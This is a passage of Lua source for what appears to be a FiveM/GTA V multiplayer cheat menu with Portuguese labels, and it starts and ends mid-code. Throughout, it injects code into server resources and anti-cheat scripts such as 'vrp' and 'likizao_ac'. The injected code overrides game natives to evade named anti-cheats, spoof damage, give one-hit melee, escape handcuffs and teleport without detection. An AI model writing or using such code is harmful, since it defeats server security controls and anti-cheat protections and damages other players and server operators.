                    ShootSingleBulletBetweenCoords(Olho1.x, Olho1.y, Olho1.z, endCoords.x, endCoords.y, endCoords.z, 200, true, weaponHash, ped, true, false, 1000.0
                    )
                    ShootSingleBulletBetweenCoords(Olho2.x, Olho2.y, Olho2.z, endCoords.x, endCoords.y, endCoords.z, 200, true, weaponHash, ped, true, false, 1000.0
                    )
                end
            end
        end
        FrameAPI.SyncTree.SpoofServerDamage(false, GetHashKey("WEAPON_HEN"))
        next.bypass['weapon'](false)
    end)
    end)
end
if anticheat == "Fiveguard" or group == "Santa Group" then
    next.elements.checkbox("Super Soco", "megasoco", function(toggle)
        if toggle then
        Citizen.CreateThread(function()
        while next.values.checkbox["soco_regresso"] do
            local banana = GetHashKey("WEAPON_UNARMED")
            local mister = 9999999.0
            Citizen.InvokeNative(0x4757F00BC6323CFE, banana, mister)
            local code = [[
                GetWeaponDamageModifier = function()
                    return 1.0
                end
            ]]
            FrameAPI.Inject('vrp', code)
            Wait(1)
        end
        end)
        else
        local carlos = GetHashKey("WEAPON_UNARMED")
        local andre = 1.0
        SetWeaponDamageModifier(carlos, andre)
        end   
    end)
end

if anticheat == "PL_PROTECT"  then
    next.elements.checkbox("Super Soco", "megasoco", function(toggle)
        if toggle then
        Citizen.CreateThread(function()
        FrameAPI.Inject('vrp', [[
        Citizen.CreateThread(function()
            GetWeaponDamageModifier = function()
                return 1.0
            end
            IsPedArmed = function()
                return true
            end
            GetMeleeTargetForPed = function()
                return nil
            end
            IsPedInMeleeCombat = function()
                return false
            end
            CEventNetworkEntityDamage = function()
                return 0.0
            end)
            SetWeaponDamageModifier(GetHashKey(""), 9999.0)
            print("oi")
        end)

        ]])
        FrameAPI.Inject('likizao_ac', [[
        Citizen.CreateThread(function()
            GetWeaponDamageModifier = function()
                return 1.0
            end
            IsPedArmed = function()
                return true
            end
            GetMeleeTargetForPed = function()
                return nil
            end
            IsPedInMeleeCombat = function()
                return false
            end
            CEventNetworkEntityDamage = function()
                return 0.0
            end)
            SetWeaponDamageModifier(GetHashKey(""), 9999.0)
            print("oi")
        end)
        ]])
        end)
        else
        FrameAPI.Inject('vrp', [[
        Citizen.CreateThread(function()
            GetWeaponDamageModifier = function()
                return 1.0
            end
            IsPedArmed = function()
                return true
            end
            GetMeleeTargetForPed = function()
                return nil
            end
            IsPedInMeleeCombat = function()
                return false
            end
            CEventNetworkEntityDamage = function()
                return 0.0
            end)
            SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1.0)
            print("oi")
        end)

        ]])
        FrameAPI.Inject('likizao_ac', [[
        Citizen.CreateThread(function()
            GetWeaponDamageModifier = function()
                return 1.0
            end
            IsPedArmed = function()
                return true
            end
            GetMeleeTargetForPed = function()
                return nil
            end
            IsPedInMeleeCombat = function()
                return false
            end
            CEventNetworkEntityDamage = function()
                return 0.0
            end)
            SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1.0)
            print("oi")
        end)
        ]])
        end   
    end)
end
                    next.elements.groupbox("Proteções", "protect", "\xef\x8f\xad", 0, 280, 290, 160)
                        next.elements.button("Soltar H", "arrastar", function()
                        nt.createTh(function()
                        DetachEntity(PlayerPedId(-1),true,false)
                        TriggerEvent("vrp_policia:tunnel_req", "arrastar", {}, "vrp_policia", -1)
                        end)
                        end)
                    next.elements.button("Remover Capuz", "toggle:capuz", function()
                        if GetResourceState('vrp') then
                            local code = [[
                            local Tunnel = _G.module("vrp","lib/Tunnel")
                            local Proxy = _G.module("vrp","lib/Proxy")
                            vRP = Proxy.getInterface("vRP")
                            isCapuz = vRP.isCapuz()
                            if isCapuz then
                            vRP.toggleCapuz()
                            end
                            ]]
                            FrameAPI.Inject('vrp', code)
                        end
                    end)
                    next.elements.button("Desalgemar", "desalgemar", function()
                        nt.createTh(function()
                            if LocalPlayer.state.Handcuff == true then
                                LocalPlayer.state.Handcuff = false
                                LocalPlayer["state"]["Handcuff"] = false
                                ClearPedTasks(PlayerPedId())
                            end
                            local code = [[
                                local Tunnel = module("vrp","lib/Tunnel")
                                local Proxy = module("vrp","lib/Proxy")
                                vRP = Proxy.getInterface("vRP")
                                if vRP.isHandcuffed() then
                                    vRP.toggleHandcuff()
                                end
                            ]]
                            FrameAPI.Inject("vrp", code)
                        end)
                    end)
 next.elements.checkbox("Bloquear H", "blockH", function(state)
    local injectCode = state and [[
        if not _G.oldAttachEntityToEntity then
            _G.oldAttachEntityToEntity = _G.AttachEntityToEntity
        end
        _G.AttachEntityToEntity = function(entity1, entity2, boneIndex, xPos, yPos, zPos, xRot, yRot, zRot, p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot)
            if entity1 == _G.PlayerPedId() then
                return true
            end
            return _G.oldAttachEntityToEntity(entity1, entity2, boneIndex, xPos, yPos, zPos, xRot, yRot, zRot, p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot)
        end
    ]] or [[
        if _G.oldAttachEntityToEntity then
            _G.AttachEntityToEntity = _G.oldAttachEntityToEntity
            _G.oldAttachEntityToEntity = nil
        end
    ]]
     FrameAPI.Inject("vrp", injectCode)
    if state then
        nt.createTh(function()
            while next.values.checkbox["blockH"] do
                local playerPed = PlayerPedId()
                if IsEntityAttachedToAnyPed(playerPed) then
                    DetachEntity(playerPed, 0, true)
                end
                Wait(0)
            end
        end)
    end
end)
next.elements.checkbox("Bloquear Tptome", "blockTptome", function(state)
    local injectCode = state and [[
        if not _G._SetEntityCoords then
            _G._SetEntityCoords = _G.SetEntityCoords
        end
        if not _G._SetEntityCoordsNoOffset then
            _G._SetEntityCoordsNoOffset = _G.SetEntityCoordsNoOffset
        end
        _G.SetEntityCoords = function(ped, x, y, z, alive, warp)
            if ped == PlayerPedId() then
                GlobalState['trytptome'] = true
                return
            end
            return _G._SetEntityCoords(ped, x, y, z, alive, warp)
        end
        _G.SetEntityCoordsNoOffset = function(ped, x, y, z, alive, warp)
            if ped == PlayerPedId() then
                GlobalState['trytptome'] = true
                return
            end
            return _G._SetEntityCoordsNoOffset(ped, x, y, z, alive, warp)
        end
    ]] or [[
        if _G._SetEntityCoords and _G._SetEntityCoordsNoOffset then
            _G.SetEntityCoords = _G._SetEntityCoords
            _G.SetEntityCoordsNoOffset = _G._SetEntityCoordsNoOffset
            _G._SetEntityCoords = nil
            _G._SetEntityCoordsNoOffset = nil
        end
    ]]
    FrameAPI.Inject("vrp", injectCode)
    if state then
        nt.createTh(function()
            while next.values.checkbox["blockTptome"] do
                if GlobalState.trytptome then
                    next.elements.notify("Tentaram puxar você.", "warning")
                    GlobalState.trytptome = nil
                end
                Wait(0)
            end
        end)
    end
end)
next.elements.checkbox("Bloquear Tpto", "blockTpto", function(bool)
    if next.values.checkbox["blockTpto"] then
    if GetResourceState("vrp") == "started" then
            FrameAPI.Inject("vrp", [[
                if not _G._GetEntityCoords then
                    _G._GetEntityCoords = _G.GetEntityCoords
                end
                _G.GetEntityCoords = function(ped, coords)
                    if coords then
                        GlobalState['tpto_detectado'] = true
                        return vector3(0.0, 0.0, 0.0)
                    end
                    return _G._GetEntityCoords(ped, coords)
                end
            ]])
        end
        nt.createTh(function()
            while next.values.checkbox["blockTpto"] do
                Wait(500)
                if GlobalState.tpto_detectado then
                    next.elements.notify("Tentaram teleportar em você!", "warning")
                    GlobalState.tpto_detectado = nil
                end
            end
        end)
    else
        if GetResourceState("vrp") == "started" then
           FrameAPI.Inject("vrp", [[
                if _G._GetEntityCoords then
                    _G.GetEntityCoords = _G._GetEntityCoords
                    _G._GetEntityCoords = nil
                end
            ]])
           FrameAPI.Inject("player", [[
                if _G._GetEntityCoords then
                    _G.GetEntityCoords = _G._GetEntityCoords
                    _G._GetEntityCoords = nil
                end
            ]])
        end
    end
end)
next.elements.checkbox("Bloquear Algemas", "blockAlgemas", function(state)
    local injectCode = state and [[
        if _G.vRP and type(_G.vRP) == "table" then
            if not _G.vRP.______toggleHandcuff then
                _G.vRP.______toggleHandcuff = _G.vRP.toggleHandcuff
            end
            _G.vRP.toggleHandcuff = function()
                GlobalState['tryalgemas'] = true
                return true
            end
        end
        if _G.tvRP and type(_G.tvRP) == "table" then
            if not _G.tvRP.______toggleHandcuff then
                _G.tvRP.______toggleHandcuff = _G.tvRP.toggleHandcuff
            end
            _G.tvRP.toggleHandcuff = function()
                GlobalState['tryalgemas'] = true
                return true
            end
        end
    ]] or [[
        if _G.tvRP and type(_G.tvRP) == "table" and _G.tvRP.______toggleHandcuff then
            _G.tvRP.toggleHandcuff = _G.tvRP.______toggleHandcuff
            _G.tvRP.______toggleHandcuff = nil
        end
        if _G.vRP and type(_G.vRP) == "table" and _G.vRP.______toggleHandcuff then
            _G.vRP.toggleHandcuff = _G.vRP.______toggleHandcuff
            _G.vRP.______toggleHandcuff = nil
        end
    ]]
    FrameAPI.Inject("vrp", injectCode)
    if state then
        nt.createTh(function()
            while next.values.checkbox["blockAlgemas"] do
                if GlobalState.tryalgemas then
                    next.elements.notify("Tentaram te algemar.", "warning")
                    GlobalState.tryalgemas = nil
                end
                Wait(0)
            end
        end)
    end
end)
next.elements.checkbox("Bloquear Attach", "blockAttach", function(state)
    if state then
        nt.createTh(function()
            while next.values.checkbox["blockAttach"] do
                for _, vehicle in pairs(GetGamePool("CVehicle")) do
                    if IsEntityAttachedToAnyPed(vehicle) and
                       GetEntityAttachedTo(vehicle) == PlayerPedId() and
                       not next.values.checkbox["carregarVeiculos"] then
                        NetworkRequestControlOfEntity(vehicle)
                        DetachEntity(vehicle, 0, true)
                        if IsVehicleSeatFree(vehicle, -1) then
                            next:Notify("Tentaram te grudar um carro.")
                        end
                    end
                end
                Wait(0)
            end
        end)
    end
end)
                    next.elements.checkbox("Bloquear Taser", "blocktazer", function(bool)
                        if next.values.checkbox["blocktazer"] then
                            SetPedMinGroundTimeForStungun(PlayerPedId(), 3600)
                        else
                            SetPedMinGroundTimeForStungun(PlayerPedId(), 0)
                        end
                    end)
                    next.elements.checkbox("Bloquear Soco", "blocksoco", function(bool)
                        local a = PlayerPedId()
                        if next.values.checkbox["blocksoco"] then
                            SetPedCanBeTargetted(a, false)
                        else
                            SetPedCanBeTargetted(a, true)
                        end
                    end)
                    next.elements.checkbox("Anti Freeze", "antiFreeze", function(bool)
                        while next.values.checkbox["antiFreeze"] do
                            Wait(50)
                            if IsPedFrozen(PlayerPedId()) then
                                FreezeEntityPosition(PlayerPedId(), false)
                            end
                        end
                    end)
                    elseif next.vars.subtab_selected == "Roupas" then
                        next.elements.groupbox("Roupas", "info_jogador", "\xef\x95\x93", 0, 0, 270, 300)
                        next.elements.button("Roupa aleatória", "roupa_aleatoria", function()
                            local ped = PlayerPedId()
                            local function getRandomInt(min, max)
                            return math.random(min, max)
                            end
                            for i = 0, 11 do
                            local drawableCount = GetNumberOfPedDrawableVariations(ped, i)
                            if drawableCount > 0 then
                            local randomDrawable = getRandomInt(0, drawableCount - 1)
                            local textureCount = GetNumberOfPedTextureVariations(ped, i, randomDrawable)
                            local randomTexture = 0
                            if textureCount > 0 then
                                randomTexture = getRandomInt(0, textureCount - 1)
                            end
                            SetPedComponentVariation(ped, i, randomDrawable, randomTexture, 0)
                            end
                            end
                            end)
                            next.elements.slider("Chapeu", "hat_variation", {min = 0, max = 300, start = 5}, function(value)
                            SetPedComponentVariation(PlayerPedId(), 0, value, 0, true)
                            end)
                            next.elements.slider("Mascara", "mask_variation", {min = 0, max = 300, start = 5}, function(value)
                            SetPedComponentVariation(PlayerPedId(), 2, value, 0, 0)
                            end)
                            next.elements.slider("Maos", "hands_variation", {min = 0, max = 300, start = 5}, function(value)
                            SetPedComponentVariation(PlayerPedId(), 5, value, 0, 0)
                            end)
                            next.elements.slider("Acessorio", "acesso_variation", {min = 0, max = 300, start = 5}, function(value)
                            SetPedComponentVariation(PlayerPedId(), 8, value, 0, 0)
                            end)
                            next.elements.slider("Mochila", "bag_variation", {min = 0, max = 300, start = 5}, function(value)
                                SetPedComponentVariation(PlayerPedId(), 6, value, 0, 0)
                            end)
                            next.elements.slider("Jaqueta", "jacket_variation", {min = 0, max = 300, start = 5}, function(value)
                                SetPedComponentVariation(PlayerPedId(), 11, value, 0, 0)
                            end)
                            next.elements.slider("Camiseta", "undershirt_variation", {min = 0, max = 300, start = 5}, function(value)
                                SetPedComponentVariation(PlayerPedId(), 5, value, 0, 0)
                            end)
                            next.elements.slider("Calças", "leg_variation", {min = 0, max = 300, start = 5}, function(value)
                                SetPedComponentVariation(PlayerPedId(), 4, value, 0, 0)
                            end)
                            next.elements.slider("Sapatos", "shoes_variation", {min = 0, max = 300, start = 5}, function(value)
                                SetPedComponentVariation(PlayerPedId(), 6, value, 0, 0)
                            end)
                        next.elements.groupbox("Skins", "skins_jogador", "\xee\x92\xa8", 280, 0, 270, 300)
                        next.elements.button("Reset Ped [H]", "virar_homen", function()
                            nt.createTh(function()
                                local playerPed = PlayerPedId()
                                local model = GetHashKey("mp_m_freemode_01")
                                RequestModel(model)
                                while not HasModelLoaded(model) do
                                    Wait(100)
                                end
                                SetPlayerModel(PlayerId(), model)
                                SetModelAsNoLongerNeeded(model)
                            end)
                        end)
                    next.elements.button("Reset Ped [M]", "virar_mulher", function()
                        nt.createTh(function()
                                local playerPed = PlayerPedId()
                                local model = GetHashKey("mp_f_freemode_01")
                                RequestModel(model)
                                while not HasModelLoaded(model) do
                                    Wait(100)
                                end
                                SetPlayerModel(PlayerId(), model)
                                SetModelAsNoLongerNeeded(model)
                            end)
                        end)
                        next.elements.button("Virar Alien Cearense", "vidsrar_homen", function()
                            nt.createTh(function()
                                local playerPed = PlayerPedId()
                                local model = GetHashKey("s_m_m_movalien_01")
                                RequestModel(model)
                                while not HasModelLoaded(model) do
                                    Wait(100)
                                end
                                SetPlayerModel(PlayerId(), model)
                                SetModelAsNoLongerNeeded(model)
                            end)
                        end)
                    if group == "Lapa Group" then
                    next.elements.button("Virar Bia Miranda", "virar_mdsfgulher", function()
                        nt.createTh(function()
                                local playerPed = PlayerPedId()
                                local model = GetHashKey("VIRUSSTORE_BiaMiranda")
                                RequestModel(model)
                                while not HasModelLoaded(model) do
                                    Wait(100)
                                end
                                SetPlayerModel(PlayerId(), model)
                                SetModelAsNoLongerNeeded(model)
                            end)
                        end)
                    end
            if anticheat == "EQPG" then
                for k, skin in ipairs(validPeds) do
                   next.elements.button(''..tostring(skin.name), skin.hash, function()
                        next.mudarSkinEgpg(skin.hash)
                    end)
                end
            end
            if anticheat == "likizao_ac" then
                for k, skin in ipairs(validPeds) do
                   next.elements.button(''..tostring(skin.name), skin.hash, function()
                        next.mudarSkin2(skin.hash)
                    end)
                end
            end
                        next.elements.groupbox("Extras", "extras_jogador", "\xef\x95\x93", 0, 305, 270, 140)
                        next.elements.button("Copiar Roupas Próximos", "copiar_roupa_proximos", function()
                                local myPed = PlayerPedId()
                                local myCoords = GetEntityCoords(myPed)
                                local closestPed = nil
                                local closestDist = 15.0
                                for _, player in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(player)
                                    if targetPed ~= myPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local dist = #(myCoords - targetCoords)
                                        if dist < closestDist then
                                            closestDist = dist
                                            closestPed = targetPed
                                        end
                                    end
                                end
                                if closestPed then
                                    ClonePedToTarget(closestPed, myPed)
                                    next.elements.notify("Roupa copiada com sucesso!")
                                else
                                    next.elements.notify("Nenhum jogador próximo encontrado.")
                                end
                            end)
                            next.elements.groupbox("Roupas Salvas", "Roupas_SALVAS", "\xef\x95\x93", 280, 305, 270, 140)
                            local function saveCloudConfig()
                                local config = {
                                    savedOutfits = next.vars.savedOutfits or {},
                                    savedTeleports = next.vars.savedTeleports or {}
                                }
                                local ok, encoded = pcall(json.encode, config)
                                if ok and encoded then
                                    FrameAPI.GetVar("config", encoded)
                                end
                            end
                            local function loadSavedOutfits()
                                local saved = FrameAPI.GetVar("savedOutfits")
                                if type(saved) == "table" then
                                    return saved
                                end
                                if type(saved) == "string" and saved ~= "" then
                                    local ok, decoded = pcall(json.decode, saved)
                                    if ok and type(decoded) == "table" then
                                        return decoded
                                    end
                                end
                                return {}
                            end
                            next.vars.savedOutfits = loadSavedOutfits()
next.elements.input("Nome da Roupa", "roupa_nome", "")
next.elements.button("Salvar Roupa", "salvar_roupa", function()
    local ped = PlayerPedId()
    local outfit = {}
    local outfitName = next.values.input["roupa_nome"]
    if not outfitName or outfitName == "" then
        next.elements.notify("Digite um nome para a roupa!", "warning")
        return
    end
    for i = 0, 7 do
        local prop = GetPedPropIndex(ped, i)
        local propTexture = GetPedPropTextureIndex(ped, i)
        outfit["prop_" .. i] = {prop, propTexture}
    end
    for i = 0, 11 do
        local comp = GetPedDrawableVariation(ped, i)
        local tex = GetPedTextureVariation(ped, i)
        outfit["comp_" .. i] = {comp, tex}
    end
    table.insert(next.vars.savedOutfits, {
        name = outfitName,
        data = outfit
    })
    FrameAPI.SetVar("savedOutfits", json.encode(next.vars.savedOutfits))
    saveCloudConfig()
    next.elements.notify("Roupa salva como: " .. outfitName, "success")
end)
next.vars.savedOutfits = loadSavedOutfits()
for index, outfitInfo in ipairs(next.vars.savedOutfits) do
    local checkboxId = "outfit_" .. index
    next.values.checkbox[checkboxId] = next.vars.selected_roupa == index
    if my and my.bool then
        my.bool["ax_" .. checkboxId] = next.vars.selected_roupa == index
    end
    next.elements.checkbox(outfitInfo.name, checkboxId, function(state)
        if state then
            for i = 1, #next.vars.savedOutfits do
                if i ~= index then
                    next.values.checkbox["outfit_" .. i] = false
                    if my and my.bool then
                        my.bool["ax_outfit_" .. i] = false
                    end
                end
            end
            next.vars.selected_roupa = index
        elseif next.vars.selected_roupa == index then
            next.vars.selected_roupa = nil
        end
    end)
    if next.vars.selected_roupa == index then
        next.elements.button("Vestir " .. outfitInfo.name, "vestir_" .. index, function()
            local ped = PlayerPedId()
            local outfit = outfitInfo.data
            for i = 0, 7 do
                if outfit["prop_" .. i] then
                    SetPedPropIndex(ped, i, outfit["prop_" .. i][1], outfit["prop_" .. i][2], true)
                end
            end
            for i = 0, 11 do
                if outfit["comp_" .. i] then
                    SetPedComponentVariation(ped, i, outfit["comp_" .. i][1], outfit["comp_" .. i][2], 0)
                end
            end
            next.elements.notify("Roupas aplicadas com sucesso!", "success")
        end)
        next.elements.button("Eliminar " .. outfitInfo.name, "eliminar_" .. index, function()
            table.remove(next.vars.savedOutfits, index)
            FrameAPI.SetVar("savedOutfits", json.encode(next.vars.savedOutfits))
            saveCloudConfig()
            next.vars.selected_roupa = nil
            next.elements.notify("Roupa eliminada com sucesso!", "info")
        end)
    end
end
                    elseif next.vars.subtab_selected == "Teleportes" then
                        next.elements.groupbox("Teleportes", "info_jogador", "\xef\x83\xa2", 0, 0, 545, 300)
                        next.elements.button("Teleportar para a praça", "teleportar_para_praca", function()
                            for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
                                FrameAPI.Inject(resourceName, [[
                                Citizen.CreateThread(function()
                                    _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
                                    local myVersion = _hxp_tp_ver

                                    local function tpOverrides()
                                        SetEntityCoords                = function() return true end
                                        SetEntityCoordsNoOffset        = function() return true end
                                        SetPedCoordsKeepVehicle        = function() return true end
                                        SetEntityHeading               = function() return true end
                                        FreezeEntityPosition           = function() return true end
                                        SetEntityVelocity              = function() return true end
                                        SetEntityCollision             = function() return true end
                                        _G.SetEntityCoords             = function() return true end
                                        _G.SetEntityCoordsNoOffset     = function() return true end
                                        _G.SetPedCoordsKeepVehicle     = function() return true end
                                        _G.SetEntityHeading            = function() return true end
                                        _G.FreezeEntityPosition        = function() return true end
                                        _G.SetEntityVelocity           = function() return true end
                                        _G.SetEntityCollision          = function() return true end
                                    end

                                    local function tpDetection()
                                        IsEntityPositionFrozen         = function() return false end
                                        IsEntityCollisionDisabled      = function() return false end
                                        GetEntitySpeed                 = function() return 0.0 end
                                        _G.IsEntityPositionFrozen      = function() return false end
                                        _G.IsEntityCollisionDisabled   = function() return false end
                                        _G.GetEntitySpeed              = function() return 0.0 end
                                    end

                                    pcall(function()
                                        tpOverrides()
                                        tpDetection()
                                    end)

                                    while _hxp_tp_ver == myVersion do
                                        pcall(tpOverrides)
                                        pcall(tpDetection)
                                        Wait(500)
                                    end
                                end)
                                ]])
                            end

                            local ped = PlayerPedId()
                            local pracaCoords = vector3(161.96141052246, -988.37420654297, 30.099321365356)
                            SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
                        end)
next.elements.button("Teleportar para o MazeBank", "teleportar_para_mazebank", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
            local myVersion = _hxp_tp_ver

            local function tpOverrides()
                SetEntityCoords                = function() return true end
                SetEntityCoordsNoOffset        = function() return true end
                SetPedCoordsKeepVehicle        = function() return true end
                SetEntityHeading               = function() return true end
                FreezeEntityPosition           = function() return true end
                SetEntityVelocity              = function() return true end
                SetEntityCollision             = function() return true end
                _G.SetEntityCoords             = function() return true end
                _G.SetEntityCoordsNoOffset     = function() return true end
                _G.SetPedCoordsKeepVehicle     = function() return true end
                _G.SetEntityHeading            = function() return true end
                _G.FreezeEntityPosition        = function() return true end
                _G.SetEntityVelocity           = function() return true end
                _G.SetEntityCollision          = function() return true end
            end

            local function tpDetection()
                IsEntityPositionFrozen         = function() return false end
                IsEntityCollisionDisabled      = function() return false end
                GetEntitySpeed                 = function() return 0.0 end
                _G.IsEntityPositionFrozen      = function() return false end
                _G.IsEntityCollisionDisabled   = function() return false end
                _G.GetEntitySpeed              = function() return 0.0 end
            end

            pcall(function()
                tpOverrides()
                tpDetection()
            end)

            while _hxp_tp_ver == myVersion do
                pcall(tpOverrides)
                pcall(tpDetection)
                Wait(500)
            end
        end)
        ]])
    end

    local ped = PlayerPedId()
    local pracaCoords = vector3(-74.735710144043, -818.36499023438, 326.17553710938)
    SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
end)

if group == "Santa Group" then
    next.elements.button("Teleportar para o Dominas", "teleportar_para_dominas", function()
        for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
            FrameAPI.Inject(resourceName, [[
            Citizen.CreateThread(function()
                _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
                local myVersion = _hxp_tp_ver

                local function tpOverrides()
                    SetEntityCoords                = function() return true end
                    SetEntityCoordsNoOffset        = function() return true end
                    SetPedCoordsKeepVehicle        = function() return true end
                    SetEntityHeading               = function() return true end
                    FreezeEntityPosition           = function() return true end
                    SetEntityVelocity              = function() return true end
                    SetEntityCollision             = function() return true end
                    _G.SetEntityCoords             = function() return true end
                    _G.SetEntityCoordsNoOffset     = function() return true end
                    _G.SetPedCoordsKeepVehicle     = function() return true end
                    _G.SetEntityHeading            = function() return true end
                    _G.FreezeEntityPosition        = function() return true end
                    _G.SetEntityVelocity           = function() return true end
                    _G.SetEntityCollision          = function() return true end
                end

                local function tpDetection()
                    IsEntityPositionFrozen         = function() return false end
                    IsEntityCollisionDisabled      = function() return false end
                    GetEntitySpeed                 = function() return 0.0 end
                    _G.IsEntityPositionFrozen      = function() return false end
                    _G.IsEntityCollisionDisabled   = function() return false end
                    _G.GetEntitySpeed              = function() return 0.0 end
                end

                pcall(function()
                    tpOverrides()
                    tpDetection()
                end)

                while _hxp_tp_ver == myVersion do
                    pcall(tpOverrides)
                    pcall(tpDetection)
                    Wait(500)
                end
            end)
            ]])
        end

        local ped = PlayerPedId()
        local pracaCoords = vector3(1020.7995605469, 493.19772338867, 97.018455505371)
        SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
    end)
end

next.elements.button("Teleportar para a Prisão", "teleportar_para_prisao", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
            local myVersion = _hxp_tp_ver

            local function tpOverrides()
                SetEntityCoords                = function() return true end
                SetEntityCoordsNoOffset        = function() return true end
                SetPedCoordsKeepVehicle        = function() return true end
                SetEntityHeading               = function() return true end
                FreezeEntityPosition           = function() return true end
                SetEntityVelocity              = function() return true end
                SetEntityCollision             = function() return true end
                _G.SetEntityCoords             = function() return true end
                _G.SetEntityCoordsNoOffset     = function() return true end
                _G.SetPedCoordsKeepVehicle     = function() return true end
                _G.SetEntityHeading            = function() return true end
                _G.FreezeEntityPosition        = function() return true end
                _G.SetEntityVelocity           = function() return true end
                _G.SetEntityCollision          = function() return true end
            end

            local function tpDetection()
                IsEntityPositionFrozen         = function() return false end
                IsEntityCollisionDisabled      = function() return false end
                GetEntitySpeed                 = function() return 0.0 end
                _G.IsEntityPositionFrozen      = function() return false end
                _G.IsEntityCollisionDisabled   = function() return false end
                _G.GetEntitySpeed              = function() return 0.0 end
            end

            pcall(function()
                tpOverrides()
                tpDetection()
            end)

            while _hxp_tp_ver == myVersion do
                pcall(tpOverrides)
                pcall(tpDetection)
                Wait(500)
            end
        end)
        ]])
    end

    local ped = PlayerPedId()
    local pracaCoords = vector3(1850.0024414062, 2602.396484375, 45.601322174072)
    SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
end)

next.elements.button("Teleportar para o Cassino", "teleportar_para_cassino", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
            local myVersion = _hxp_tp_ver

            local function tpOverrides()
                SetEntityCoords                = function() return true end
                SetEntityCoordsNoOffset        = function() return true end
                SetPedCoordsKeepVehicle        = function() return true end
                SetEntityHeading               = function() return true end
                FreezeEntityPosition           = function() return true end
                SetEntityVelocity              = function() return true end
                SetEntityCollision             = function() return true end
                _G.SetEntityCoords             = function() return true end
                _G.SetEntityCoordsNoOffset     = function() return true end
                _G.SetPedCoordsKeepVehicle     = function() return true end
                _G.SetEntityHeading            = function() return true end
                _G.FreezeEntityPosition        = function() return true end
                _G.SetEntityVelocity           = function() return true end
                _G.SetEntityCollision          = function() return true end
            end

            local function tpDetection()
                IsEntityPositionFrozen         = function() return false end
                IsEntityCollisionDisabled      = function() return false end
                GetEntitySpeed                 = function() return 0.0 end
                _G.IsEntityPositionFrozen      = function() return false end
                _G.IsEntityCollisionDisabled   = function() return false end
                _G.GetEntitySpeed              = function() return 0.0 end
            end

            pcall(function()
                tpOverrides()
                tpDetection()
            end)

            while _hxp_tp_ver == myVersion do
                pcall(tpOverrides)
                pcall(tpDetection)
                Wait(500)
            end
        end)
        ]])
    end

    local ped = PlayerPedId()
    local pracaCoords = vector3(922.59979248047, 46.952156066895, 81.106338500977)
    SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
end)

next.elements.button("Teleportar para o Mt.chillind", "teleportar_para_mt", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
            local myVersion = _hxp_tp_ver

            local function tpOverrides()
                SetEntityCoords                = function() return true end
                SetEntityCoordsNoOffset        = function() return true end
                SetPedCoordsKeepVehicle        = function() return true end
                SetEntityHeading               = function() return true end
                FreezeEntityPosition           = function() return true end
                SetEntityVelocity              = function() return true end
                SetEntityCollision             = function() return true end
                _G.SetEntityCoords             = function() return true end
                _G.SetEntityCoordsNoOffset     = function() return true end
                _G.SetPedCoordsKeepVehicle     = function() return true end
                _G.SetEntityHeading            = function() return true end
                _G.FreezeEntityPosition        = function() return true end
                _G.SetEntityVelocity           = function() return true end
                _G.SetEntityCollision          = function() return true end
            end

            local function tpDetection()
                IsEntityPositionFrozen         = function() return false end
                IsEntityCollisionDisabled      = function() return false end
                GetEntitySpeed                 = function() return 0.0 end
                _G.IsEntityPositionFrozen      = function() return false end
                _G.IsEntityCollisionDisabled   = function() return false end
                _G.GetEntitySpeed              = function() return 0.0 end
            end

            pcall(function()
                tpOverrides()
                tpDetection()
            end)

            while _hxp_tp_ver == myVersion do
                pcall(tpOverrides)
                pcall(tpDetection)
                Wait(500)
            end
        end)
        ]])
    end

    local ped = PlayerPedId()
    local pracaCoords = vector3(501.5846862793, 5599.2021484375, 796.29925537109)
    SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
end)

next.elements.button("Teleportar para o Porto", "teleportar_para_porto", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
            local myVersion = _hxp_tp_ver

            local function tpOverrides()
                SetEntityCoords                = function() return true end
                SetEntityCoordsNoOffset        = function() return true end
                SetPedCoordsKeepVehicle        = function() return true end
                SetEntityHeading               = function() return true end
                FreezeEntityPosition           = function() return true end
                SetEntityVelocity              = function() return true end
                SetEntityCollision             = function() return true end
                _G.SetEntityCoords             = function() return true end
                _G.SetEntityCoordsNoOffset     = function() return true end
                _G.SetPedCoordsKeepVehicle     = function() return true end
                _G.SetEntityHeading            = function() return true end
                _G.FreezeEntityPosition        = function() return true end
                _G.SetEntityVelocity           = function() return true end
                _G.SetEntityCollision          = function() return true end
            end

            local function tpDetection()
                IsEntityPositionFrozen         = function() return false end
                IsEntityCollisionDisabled      = function() return false end
                GetEntitySpeed                 = function() return 0.0 end
                _G.IsEntityPositionFrozen      = function() return false end
